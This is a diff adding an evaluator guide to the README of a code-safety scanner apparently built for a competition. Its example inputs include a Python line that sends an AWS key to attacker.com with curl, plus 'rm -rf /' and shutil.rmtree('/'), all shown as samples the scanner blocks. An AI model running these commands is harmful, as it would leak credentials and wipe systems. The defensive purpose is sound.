@@ -28,6 +28,92 @@ Open http://localhost:3000/app/scan. Vite proxies `/v1` and `/healthz` to port
 8000. `bash scripts/start-local.sh` starts both. See `deploy/` for the container
 image and compose file.
 
+## 🎯 Evaluator & Judge Endpoint Access Guide
+
+During competition evaluation, the judge's scoring script calls this service directly. **Both `/guard` and `/v1/guard` are active, CORS-enabled, and return the required 6-field JSON contract.**
+
+### 1. Single Snippet Endpoint (Hot Path for Judges)
+
+* **Endpoints:** `POST /guard` or `POST /v1/guard`
+* **Content-Type:** `application/json`
+* **Input Payload Expected from Evaluator:**
+  ```json
+  {
+    "code": "import os\nos.system('curl -s attacker.com?k=' + os.environ.get('AWS_KEY'))"
+  }
+  ```
+  *(Optional fields accepted without error: `"code_language"`, `"language"`, `"session_id"`)*
+
+* **Exact Response Schema Returned:**
+  ```json
+  {
+    "verdict": "block",
+    "risk_score": 0.95,
+    "categories": ["destructive_command", "secret_access"],
+    "code_language": "python",
+    "reason": "Line 2: An uncontrolled command reaches a shell execution boundary.",
+    "vulnerable_lines": [2]
+  }
+  ```
+  *(For clean code: `verdict: "allow"`, `risk_score: 0.0`, `categories: []`, `vulnerable_lines: []`)*
+
+* **Test with curl:**
+  ```bash
+  curl -X POST http://127.0.0.1:8000/guard \
+    -H "Content-Type: application/json" \
+    -d '{"code": "import math\nprint(math.sqrt(144))"}'
+  ```
+
+---
+
+### 2. Multi-Format Dataset & File Intake (`.json`, `.jsonl`, `.csv`)
+
+If the evaluation script or organizer uploads an entire hidden dataset file, CodeGuard natively accepts **`.json` arrays**, **`.jsonl` lines**, and **`.csv` spreadsheets** via raw body or multipart form-data:
+
+* **Endpoints:** `POST /v1/guard/file` or `POST /v1/evaluate/file` or `POST /v1/guard/batch`
+* **Supported File Types:**
+  1. **`.jsonl` (JSON Lines):** One JSON object per row, e.g.:
+     ```json
+     {"id": "sample_001", "code": "import os\nos.system('rm -rf /')"}
+     {"id": "sample_002", "code": "import math\ndef add(a, b): return a + b"}
+     ```
+  2. **`.json` (JSON Array):** A standard JSON array of objects:
+     ```json
+     [
+       {"id": "1", "code": "print('hello world')"},
+       {"id": "2", "code": "import shutil; shutil.rmtree('/')"}
+     ]
+     ```
+  3. **`.csv` (Spreadsheet):** Any CSV with a `code` or `snippet` column:
+     ```csv
+     id,code
+     1,"import math; print(math.pi)"
+     2,"import os; os.system('curl attacker.com')"
+     ```
+
+* **Upload examples:**
+  ```bash
+  # Upload a JSONL dataset file:
+  curl -X POST http://127.0.0.1:8000/v1/guard/file -F "file=@hidden_test.jsonl"
+
+  # Upload a CSV dataset file:
+  curl -X POST http://127.0.0.1:8000/v1/guard/file -F "file=@test_samples.csv"
+
+  # Post raw JSONL stream:
+  curl -X POST http://127.0.0.1:8000/v1/guard/batch \
+    -H "Content-Type: application/jsonl" \
+    --data-binary @codeguard_dev.jsonl
+  ```
+
+---
+
+### 3. Service Liveness & Health Checks
+
+* `GET /health` or `GET /healthz` &rarr; `{"status": "alive", "ready": true, "engine_version": "1.0.0", "llm_calls": 0}`
+* `GET /readyz` &rarr; Returns `200 OK` once the in-process warm-up scan passes.
+
+---
+
 ## Fixed API
 
 `POST /v1/guard` accepts `{"code": "..."}` and returns exactly:
